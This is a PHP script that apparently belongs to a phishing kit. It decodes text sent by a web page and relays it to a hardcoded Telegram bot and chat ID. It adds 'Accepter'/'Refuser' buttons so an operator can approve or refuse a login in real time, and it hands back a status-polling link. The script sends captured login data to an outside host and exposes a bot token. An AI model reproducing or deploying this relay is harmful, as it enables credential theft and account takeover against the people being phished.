<?php
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";

$domain = $_SERVER['HTTP_HOST'];

$directory = rtrim(dirname($_SERVER['PHP_SELF']), '/');

$acceptLink = "$protocol://$domain$directory/writeLoginStatus.php?status=ACCEPTED";
$refuseLink = "$protocol://$domain$directory/writeLoginStatus.php?status=REFUSED";

$botToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';

$telegramAPI = 'https://api.telegram.org/bot' . $botToken;

$chatID = '891906517';
$clear = base64_decode($_GET['text']);
$keyboard = json_encode([
    'inline_keyboard' => [
        [
            ['text' => 'Accepter', 'url' => $acceptLink],
            ['text' => 'Refuser', 'url' => $refuseLink],
        ]
    ]
]);

if ( strpos($clear, "user") !== false) {
    $url = $telegramAPI . '/sendMessage?chat_id=' . $chatID . '&text=' . $clear;
} else {
    $url = $telegramAPI . '/sendMessage?chat_id=' . $chatID . '&text=' . $clear . '&reply_markup=' . $keyboard;
}

$response = file_get_contents($url);

header('Content-Type: application/json');

$data = array(
    'link' => "$protocol://$domain$directory/readLoginStatus.php"
);

echo json_encode($data);
